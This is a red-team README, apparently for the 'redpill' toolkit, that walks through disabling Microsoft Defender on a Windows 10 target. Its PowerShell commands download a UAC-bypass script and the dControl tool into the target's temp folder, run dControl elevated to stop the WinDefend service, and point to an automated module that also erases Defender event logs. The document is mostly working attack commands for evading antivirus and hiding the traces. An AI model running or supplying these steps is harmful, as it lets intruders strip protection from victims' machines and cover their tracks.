## :octocat: Disable WinDefend service (anti-virus)

<br />

Author: @Sordum (RedTeam) | @r00t-3xp10it
Tested Under: Windows 10 (19042 build) x64 bits
dControl webpage: https://www.sordum.org/9480/defender-control-v1-9/
Required Dependencies: <b><i>Invoke-WebRequest</i></b> {native} , <b><i>dControl.zip</i></b> {auto-download}, <b><i>UacMe.ps1</i></b> {auto-download}
Optional Dependencies: none

<br />

## :octocat: DisableDefender.ps1 - Project Description
[Defender Control](https://www.sordum.org/9480/defender-control-v1-9/) is a small Portable freeware which will allow you to disable Microsoft Defender in Windows 10 completely.<br />But it requires [Admin privileges](https://www.howtogeek.com/194041/how-to-open-the-command-prompt-as-administrator-in-windows-8.1/) on shell to do it .. The solluction ?? [@redpill - UacMe.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/bin/UacMe.ps1) Or [@redpill - DisableDefender.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/bin/DisableDefender.ps1) <-- (under dev)

<br />

## :octocat: Proof-Of-Concept ( Disable WinDefend Manually )

Upload <b><i>'dControl.exe'</i></b> + <b><i>'dControl.ini'</i></b> + <b><i>'UacMe.ps1'</i></b> to target <b><i>%tmp%</i></b> directory.
```Powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/UacMe.ps1" -OutFile "$Env:TMP\UacMe.ps1"
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/DWD/dControl.zip" -OutFile "$Env:TMP\dControl.zip"
```

Expand <b><i>'dControl.zip'</i></b> archives
```powershell
Expand-Archive -Path "$Env:TMP\dControl.zip" -DestinationPath "$Env:TMP" -Force
```

Change to  [@redpill](https://github.com/r00t-3xp10it/redpill) working directory
```powershell
cd $Env:TMP
```

<b><i>Disable</i></b> WinDefend service using [@redpill](https://github.com/r00t-3xp10it/redpill/blob/main/bin/UacMe.ps1) <b><i>'UacMe.ps1'</i></b> module
```powershell
.\UacMe.ps1 -Action Elevate -Execute "$Env:TMP\dControl.exe /D"
```

<b><i>Enable</i></b> WinDefend service using [@redpill](https://github.com/r00t-3xp10it/redpill/blob/main/bin/UacMe.ps1) <b><i>'UacMe.ps1'</i></b> module
```powershell
.\UacMe.ps1 -Action Elevate -Execute "$Env:TMP\dControl.exe /E"
```

<br /><br />

## :octocat: Proof-Of-Concept ( automatic )
Remark:  [@redpill](https://github.com/r00t-3xp10it/redpill/blob/main/bin/DisableDefender.ps1) -> DisableDefender.ps1 module automates the all process described above!<br />and deletes all artifacts left behind including eventvwr <b><i>logfiles</i></b> from Windows-Defender categorie.

Download [@redpill](https://github.com/r00t-3xp10it/redpill/blob/main/redpill.ps1)
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/redpill.ps1" -OutFile "redpill.ps1"
```

Access <b><i>'-DisableAV'</i></b> parameter <b><i>help</i></b> menu
```powershell
.\redpill.ps1 -Help DisableAV
```

<b><i>Disable</i></b> WinDefend service
```powershell
.\redpill.ps1 -DisableAV Stop
```

<b><i>Enable</i></b> WinDefend service
```powershell
.\redpill.ps1 -DisableAV Start
```
